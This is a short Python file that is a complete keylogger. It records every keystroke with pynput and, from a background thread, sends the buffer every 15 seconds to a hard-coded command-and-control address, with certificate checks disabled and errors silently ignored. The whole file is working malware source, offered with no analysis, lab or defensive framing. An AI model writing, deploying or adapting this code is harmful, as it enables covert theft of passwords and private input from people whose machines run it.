from pynput import keyboard
import requests
import threading
import time

C2_URL = "https://10.5.41.160:8443/log"
buffer = []
lock = threading.Lock()

def beacon():
    global buffer
    while True:
        time.sleep(15)
        with lock:
            if buffer:
                data = "".join(buffer)
                try:
                    requests.post(C2_URL, data={"k": data}, verify=False, timeout=5)
                except:
                    pass
                buffer = []

def on_press(key):
    with lock:
        try:
            buffer.append(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                buffer.append(" ")
            else:
                key_str = str(key).replace("Key.", "")
                buffer.append(f" [{key_str}] ")

t = threading.Thread(target=beacon, daemon=True)
t.start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()